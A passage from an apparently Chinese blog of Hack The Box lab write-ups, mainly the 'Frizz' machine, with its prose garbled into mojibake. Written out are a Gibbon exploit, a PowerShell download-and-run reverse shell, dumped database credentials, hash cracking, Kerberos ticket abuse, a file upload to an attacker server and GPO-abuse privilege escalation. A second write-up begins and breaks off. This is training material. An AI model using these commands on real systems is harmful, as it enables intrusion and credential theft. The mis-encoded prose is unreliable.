title="CVE-2023-45878"></a>CVE-2023-45878</h2><p>åœ¨é˜¿é‡Œäº‘çš„æ¼æ´åº“ä¸­æ‰¾åˆ°ç›¸å…³çš„åˆ©ç”¨ï¼Œå…¶ä¸­ä¸»è¦çš„æ˜¯ä¸éœ€è¦èº«ä»½éªŒè¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504121604131.png" alt="image-20250412160429952"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504121605468.png" alt="image-20250412160539272"></p><p>æŠ“ä¸ªåŒ…åˆ©ç”¨ä¸€ä¸‹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504121610695.png" alt="image-20250412161029473"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504121611893.png" alt="image-20250412161104799"></p><p>åå¼¹ä¸€ä¸ªshell.</p><p>åˆ©ç”¨nishangé‡Œé¢çš„ä¸€ä¸ªpowershellè„šæœ¬ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504121631082.png" alt="image-20250412163137949"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell iex (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://10.10.14.9:8081/Invoke-PowerShellTcp.ps1&#x27;</span>);Invoke-PowerShellTcp -<span class="hljs-keyword">Reverse</span> -IPAddress <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.9</span> -Port <span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><h2 id="johnçˆ†ç ´å¯†ç "><a href="#johnçˆ†ç ´å¯†ç " class="headerlink" title="johnçˆ†ç ´å¯†ç "></a>johnçˆ†ç ´å¯†ç </h2><p>åœ¨C:\xampp\htdocs\Gibbon-LMSä¸‹æœ‰ä¸€ä¸ªconfig.phpæ–‡ä»¶ï¼Œé‡Œé¢å­˜æ”¾æ•°æ®åº“çš„è´¦æˆ·å’Œå¯†ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Gibbon, Flexible &amp; Open School System</span><br><span class="hljs-comment">Copyright (C) 2010, Ross Parker</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">This program is free software: you can redistribute it and/or modify</span><br><span class="hljs-comment">it under the terms of the GNU General Public License as published by</span><br><span class="hljs-comment">the Free Software Foundation, either version 3 of the License, or</span><br><span class="hljs-comment">(at your option) any later version.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">This program is distributed in the hope that it will be useful,</span><br><span class="hljs-comment">but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="hljs-comment">MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="hljs-comment">GNU General Public License for more details.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">You should have received a copy of the GNU General Public License</span><br><span class="hljs-comment">along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Sets the database connection information.</span><br><span class="hljs-comment"> * You can supply an optional $databasePort if your server requires one.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-variable">$databaseServer</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$databaseUsername</span> = <span class="hljs-string">&#x27;MrGibbonsDB&#x27;</span>;<br><span class="hljs-variable">$databasePassword</span> = <span class="hljs-string">&#x27;MisterGibbs!Parrot!?1&#x27;</span>;<br><span class="hljs-variable">$databaseName</span> = <span class="hljs-string">&#x27;gibbon&#x27;</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Sets a globally unique id, to allow multiple installs on a single server.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-variable">$guid</span> = <span class="hljs-string">&#x27;7y59n5xz-uym-ei9p-7mmq-83vifmtyey2&#x27;</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Sets system-wide caching factor, used to balance performance and freshness.</span><br><span class="hljs-comment"> * Value represents number of page loads between cache refresh.</span><br><span class="hljs-comment"> * Must be positive integer. 1 means no caching.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-variable">$caching</span> = <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure><p>mysql.exeå†C:\xampp\mysql\binç›®å½•ä¸‹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504121804206.png" alt="image-20250412180431705"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">.\mysql<span class="hljs-selector-class">.exe</span> -u MrGibbonsDB -p<span class="hljs-string">&quot;MisterGibbs!Parrot!?1&quot;</span> -e <span class="hljs-string">&quot;show databases;&quot;</span><br>.\mysql<span class="hljs-selector-class">.exe</span> -u MrGibbonsDB -p<span class="hljs-string">&quot;MisterGibbs!Parrot!?1&quot;</span> -e <span class="hljs-string">&quot;show databases;use gibbon;show tables;&quot;</span><br>.\mysql<span class="hljs-selector-class">.exe</span> -u MrGibbonsDB -p<span class="hljs-string">&quot;MisterGibbs!Parrot!?1&quot;</span> -e <span class="hljs-string">&quot;show databases;use gibbon;select * from gibbonperson;&quot;</span> -E <span class="hljs-comment">//-Eæ˜¯ä»¥å‚ç›´æ ¼å¼è¾“å‡º</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™ä¸ª-på’Œå¯†ç ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œåé¢åŠ ä¸ª-eæ˜¯ä¸ºäº†æ‰§è¡Œå‘½ä»¤ï¼Œä¸åŠ çš„è¯ï¼Œæ‰§è¡Œå‰é¢çš„ä¼šæ²¡ç»“æœè¿”å›ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504121817519.png" alt="image-20250412181741360"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504121828385.png" alt="image-20250412182809128"></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">gender:</span> Unspecified<br><span class="hljs-symbol">               username:</span> f.frizzle<br><span class="hljs-symbol">         passwordStrong:</span> <span class="hljs-number">067f</span>746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03<br><span class="hljs-symbol">     passwordStrongSalt:</span> /aACFhikmNopqrRTVz2489<br></code></pre></td></tr></table></figure><p>johnçˆ†ç ´ä¸€ä¸‹,å®ƒæ˜¯ä¸€ä¸ªsha256çš„ã€‚</p><p>åˆ›å»ºä¸€ä¸ªhash.txt</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">f.frizzle:$dynamic_<span class="hljs-number">82</span>$<span class="hljs-number">067</span>f<span class="hljs-number">746</span>faca<span class="hljs-number">44</span>f<span class="hljs-number">170</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>cd<span class="hljs-number">9</span>d<span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>bdac<span class="hljs-number">6</span>bc<span class="hljs-number">342</span><span class="hljs-keyword">c</span><span class="hljs-number">608687733</span>f<span class="hljs-number">80</span>ff<span class="hljs-number">784242</span>b<span class="hljs-number">0</span>b<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">03</span>$/aACFhikmNopqrRTVz<span class="hljs-number">2489</span><br></code></pre></td></tr></table></figure><p>ç„¶å</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">john --format=dynamic=<span class="hljs-string">&#x27;sha256($s.$p)&#x27;</span> --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt hash.txt<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504121915689.png" alt="image-20250412191539412"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Je<span class="hljs-symbol">nni_Luvs_Magic23</span><br></code></pre></td></tr></table></figure><h2 id="åˆ›å»ºç¥¨æ®"><a href="#åˆ›å»ºç¥¨æ®" class="headerlink" title="åˆ›å»ºç¥¨æ®"></a>åˆ›å»ºç¥¨æ®</h2><p>åˆ©ç”¨kerbruteè¿›è¡ŒéªŒè¯ä¸€ä¸‹ã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">kerbrute bruteuser <span class="hljs-attr">--dc</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.60</span> -d frizz<span class="hljs-selector-class">.htb</span> pass<span class="hljs-selector-class">.txt</span> f<span class="hljs-selector-class">.frizzle</span> <br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504122018764.png" alt="image-20250412201858393"></p><p>è¿™é‡Œç›´æ¥ç”¨è´¦æˆ·å¯†ç è¿›è¡Œç™»å½•çš„è¯æ˜¯è¿›è¡Œä¸äº†çš„ï¼Œéœ€è¦åˆ©ç”¨ç¥¨æ®ã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">faketime <span class="hljs-string">&quot;$(ntpdate -q frizz.htb | awk &#x27;&#123;print $1&quot;</span> <span class="hljs-string">&quot;$2&#125;&#x27;)&quot;</span> zsh  <span class="hljs-comment">//ä¿®æ”¹æ—¶é—´</span><br>ntpdate frizzdc<span class="hljs-selector-class">.frizz</span><span class="hljs-selector-class">.htb</span>  <span class="hljs-comment">//åŒæ­¥æ—¶é—´çš„</span><br>impacket-getTGT frizz.htb/<span class="hljs-string">&#x27;f.frizzle&#x27;</span>:<span class="hljs-string">&#x27;Jenni_Luvs_Magic23&#x27;</span> -dc-ip frizzdc<span class="hljs-selector-class">.frizz</span><span class="hljs-selector-class">.htb</span>  <span class="hljs-comment">//è¯·æ±‚TGTç¥¨æ®</span><br>export KRB5CCNAME=f<span class="hljs-selector-class">.frizzle</span><span class="hljs-selector-class">.ccache</span>  <span class="hljs-comment">//åŠ è½½è¿™ä¸ªç¥¨æ®</span><br>ä¸Šé¢çš„<span class="hljs-number">22</span>ç«¯å£å¼€æ”¾ å¯ä»¥åˆ©ç”¨sshä»¥åŠç”Ÿæˆçš„ç¥¨æ®è¿œç¨‹ç™»å½•åˆ°ç›®æ ‡ä¸»æœºä¸Š<br>ssh f.frizzle@<span class="hljs-number">10.10</span>.<span class="hljs-number">11.60</span> -K <br></code></pre></td></tr></table></figure><p>æ³¨æ„è¦sshæˆåŠŸçš„è¯éœ€è¦åˆ›å»ºetc/krb5.confã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[libdefaults]</span><br>    default_realm = FRIZZ<span class="hljs-selector-class">.HTB</span><br>    dns_lookup_realm = false<br>    dns_lookup_kdc = true<br><br><span class="hljs-selector-attr">[realms]</span><br>    FRIZZ<span class="hljs-selector-class">.HTB</span> = &#123;<br>        kdc = frizzdc<span class="hljs-selector-class">.frizz</span><span class="hljs-selector-class">.htb</span><br>        admin_server = frizzdc<span class="hljs-selector-class">.frizz</span><span class="hljs-selector-class">.htb</span><br>    &#125;<br><br><span class="hljs-selector-attr">[domain_realm]</span><br>    <span class="hljs-selector-class">.frizz</span><span class="hljs-selector-class">.htb</span> = FRIZZ<span class="hljs-selector-class">.HTB</span><br>    frizz<span class="hljs-selector-class">.htb</span> = FRIZZ.HTB<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504122220797.png" alt="image-20250412222055453"></p><p>å†æ¡Œé¢å‘ç°user.txt</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504122222260.png" alt="image-20250412222232116"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504122222154.png" alt="image-20250412222250039"></p><p>è¿˜å­˜åœ¨å…¶ä»–çš„è´¦æˆ·ã€‚</p><h2 id="GPO-abuseææƒ"><a href="#GPO-abuseææƒ" class="headerlink" title="GPO abuseææƒ"></a>GPO abuseææƒ</h2><p>bloodhoundåˆ†æä¸€æ³¢ã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">bloodhound-python -u <span class="hljs-string">&#x27;f.frizzle&#x27;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&#x27;Jenni_Luvs_Magic23&#x27;</span> -d frizz<span class="hljs-selector-class">.htb</span> -dc frizzdc<span class="hljs-selector-class">.frizz</span><span class="hljs-selector-class">.htb</span> -ns <span class="hljs-number">10.10</span>.<span class="hljs-number">11.60</span> -c <span class="hljs-attribute">all</span> --zip<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504122242984.png" alt="image-20250412224206895"></p><p>åˆ©ç”¨powersellæ£€æŸ¥æ˜¯å¦æœ‰åˆ é™¤çš„æ–‡ä»¶ï¼š</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$shell</span> = New-Object -ComObject Shell.Application</span><br><span class="hljs-meta"><span class="hljs-keyword">$recycleBin</span> = $shell.Namespace(0xA)</span><br><span class="hljs-meta"><span class="hljs-keyword">$recycleBin</span>.items() | Select-Object Name, Path</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504151816394.png" alt="image-20250415181651092"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504151818769.png" alt="image-20250415181852544"></p><p>downä¸‹æ¥ã€‚</p><p>é¦–å…ˆåœ¨kaliä¸Šè¿è¡Œä¸€ä¸ªflaskæœåŠ¡ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>():<br>    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>    file.save(file.filename)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;OK&#x27;</span><br><br>app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>)<br></code></pre></td></tr></table></figure><p>ç„¶åwindowsä¸Šè¿è¡Œpowershellè„šæœ¬ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$FilePath</span> = <span class="hljs-string">&quot;C:\<span class="hljs-variable">$RECYCLE</span>.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\<span class="hljs-variable">$RE2XMEG</span>.7z&quot;</span><br><span class="hljs-variable">$Url</span> = <span class="hljs-string">&quot;http://10.10.14.80:8000/upload&quot;</span><br><br><span class="hljs-variable">$wc</span> = <span class="hljs-built_in">New-Object</span> System.Net.WebClient<br><span class="hljs-variable">$wc</span>.UploadFile(<span class="hljs-variable">$Url</span>, <span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-variable">$FilePath</span>)<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504151848338.png" alt="image-20250415184853193"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504151849604.png" alt="image-20250415184903461"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504151849027.png" alt="image-20250415184913956"></p><p>æˆåŠŸdownä¸‹æ¥ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">7</span>z x <span class="hljs-string">&#x27;$RE2XMEG.7z&#x27;</span>  <span class="hljs-regexp">//</span>è§£å‹ä¸€ä¸‹<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504151857687.png" alt="image-20250415185726549"></p><p>base64è§£ç :</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-title">!suBcig</span><span class="hljs-title">@MehTed</span><span class="hljs-title">!R</span><br></code></pre></td></tr></table></figure><p>æ˜¯ä¸€ä¸ªå¯†ç ï¼Œä½†ä¸çŸ¥é“æ˜¯è°çš„ã€‚</p><p>å¯†ç å–·æ´’ä¸€ä¸‹ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">kerbrute</span> passwordspray -d frizz.htb --dc <span class="hljs-number">10.10.11.60</span> user.txt <span class="hljs-string">&#x27;!suBcig<span class="hljs-variable">@MehTed</span>!R&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504151917964.png" alt="image-20250415191708865"></p><p>è·Ÿä¸Šé¢çš„æ€è·¯ä¸€æ ·ï¼Œç”³è¯·ç¥¨æ®ï¼Œsshç™»å½•ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">impacket-getTGT frizz.htb/<span class="hljs-string">&#x27;M.SchoolBus&#x27;</span>:<span class="hljs-string">&#x27;!suBcig@MehTed!R&#x27;</span> -dc-ip frizzdc.frizz.htb<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=M.SchoolBus.ccache <br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504151924656.png" alt="image-20250415192456547"></p><p>ä»ç„¶æ˜¯bloodhound-pythonæ”¶é›†ä¸€ä¸‹ä¿¡æ¯ï¼š</p><p>æ³¨æ„kerberosçš„æ—¶é—´ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">faketime</span> <span class="hljs-string">&quot;$(ntpdate -q frizz.htb | awk &#x27;&#123;print <span class="hljs-variable">$1</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&#125;&#x27;)&quot;</span> zsh<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">bloodhound-python -u <span class="hljs-string">&#x27;M.SchoolBus&#x27;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&#x27;!suBcig@MehTed!R&#x27;</span> -d frizz<span class="hljs-selector-class">.htb</span> -dc frizzdc<span class="hljs-selector-class">.frizz</span><span class="hljs-selector-class">.htb</span> -ns <span class="hljs-number">10.10</span>.<span class="hljs-number">11.60</span> -c <span class="hljs-attribute">all</span> --zip<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504152043647.png" alt="image-20250415204328420"></p><p>M.SchoolBuså±äºDESKTOP ADMINSç»„ æƒé™æ›´é«˜ä¸€ç‚¹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504152112072.png" alt="image-20250415211226900"></p><p>M.SchoolBusä¹Ÿå±äºGROUP POLICY CREATOR OWNERS(GPCOç»„)</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504152146186.png" alt="image-20250415214645048"></p><p>è¿™é‡Œçœ‹wpæ˜¯è¯´è¿›è¡Œ<strong>GPO abuse</strong>æ”»å‡»</p><p>åˆ›å»ºä¸€ä¸ªæ–°çš„GPOï¼Œç„¶åå°†å…¶é“¾æ¥åˆ°æ•´ä¸ªåŸŸä¸­ï¼Œåˆ©ç”¨SharpGPOAbuse.exeå°†M.SchoolBusæ·»åŠ åˆ°ç®¡ç†å‘˜ä¸­è¿™æ¡ç»„ç­–ç•¥è¿›è¡Œæ·»åŠ ï¼Œæœ€ååˆ·æ–°GPOå¯åŠ¨ä¸Šé¢çš„ç»„ç­–ç•¥ã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// åˆ›å»ºæ¶æ„GPO</span><br>New-GPO -Name <span class="hljs-string">&quot;hacker&quot;</span><br><span class="hljs-comment">// é“¾æ¥GPOåˆ°åŸŸæ§åˆ¶å™¨</span><br>New-GPLink -Name <span class="hljs-string">&quot;hacker&quot;</span> -Target <span class="hljs-string">&quot;OU=Domain Controllers,DC=frizz,DC=htb&quot;</span><br><span class="hljs-comment">// å°†M.SchoolBusåŠ å…¥åŸŸç®¡ç†å‘˜ç»„</span><br>.\SharpGPOAbuse<span class="hljs-selector-class">.exe</span> <span class="hljs-attr">--AddLocalAdmin</span> <span class="hljs-attr">--UserAccount</span> M<span class="hljs-selector-class">.SchoolBus</span> <span class="hljs-attr">--GPOName</span> hacker<br><span class="hljs-comment">// åˆ·æ–°GPO</span><br>gpupdate /force<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504152254645.png" alt="image-20250415225402344"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504152254472.png" alt="image-20250415225425376"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504152256452.png" alt="image-20250415225602315"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»è¢«æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„ä¸­ã€‚</p><p>ç„¶ååˆ©ç”¨<strong>RunasCS</strong>å¼€å¯å¦å¤–ä¸€ä¸ªè¿›ç¨‹ï¼š</p><p><a href="https://github.com/antonioCoco/RunasCs">https://github.com/antonioCoco/RunasCs</a></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">.\Runas.exe M.SchoolBus <span class="hljs-title">!suBcig</span><span class="hljs-title">@MehTed</span><span class="hljs-title">!R</span> cmd.exe -r <span class="hljs-number">10.10</span>.<span class="hljs-number">14.80</span>:<span class="hljs-number">8888</span><br>åœ¨kaliä¸Šè¿›è¡Œç›‘å¬<span class="hljs-number">8888</span>ç«¯å£<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504152305243.png" alt="image-20250415230549080"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504152306085.png" alt="image-20250415230559945"></p>]]></content>
    
    
    <categories>
      
      <category>Windowsä¸­çº§é¶æœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-WhiteRabbit</title>
    <link href="/2025/04/06/HTB-WhiteRabbit/"/>
    <url>/2025/04/06/HTB-WhiteRabbit/</url>
    
    <content type="html"><![CDATA[<h1 id="HTB-WhiteRabbit"><a href="#HTB-WhiteRabbit" class="headerlink" title="HTB-WhiteRabbit"></a>HTB-WhiteRabbit</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>é¦–å…ˆå…ˆå°†whiterabbit.htbæ·»åŠ åˆ°/etc/hostsä¸­</p><p>ç„¶ååˆ©ç”¨rustscanè¿›è¡Œæ‰«ä¸€æ³¢</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rustscan</span> -a <span class="hljs-number">10.10.11.63</span> --range <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> -- -sV<span class="hljs-meta"></span><br><span class="hljs-meta">[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers</span><br><span class="hljs-meta">[!] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;--ulimit 5000&#x27;. </span><br><span class="hljs-meta">Open 10.10.11.63:22</span><br><span class="hljs-meta">Open 10.10.11.63:80</span><br><span class="hljs-meta">Open 10.10.11.63:2222</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">[~] Starting Nmap</span><br><span class="hljs-meta">[&gt;] The Nmap command to be run is nmap -sV -vvv -p 22,80,2222 10.10.11.63</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-06 06:06 UTC</span><br><span class="hljs-meta">NSE: Loaded 46 scripts for scanning.</span><br><span class="hljs-meta">Initiating Ping Scan at 06:06</span><br><span class="hljs-meta">Scanning 10.10.11.63 [4 ports]</span><br><span class="hljs-attribute">Stats</span>: <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">0</span> up), <span class="hljs-number">1</span> undergoing Ping Scan<br><span class="hljs-attribute">Ping</span> Scan Timing: About <span class="hljs-number">100</span>.<span class="hljs-number">00</span>% done; ETC: <span class="hljs-number">06</span>:<span class="hljs-number">06</span> (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> remaining)<br><span class="hljs-attribute">Completed</span> Ping 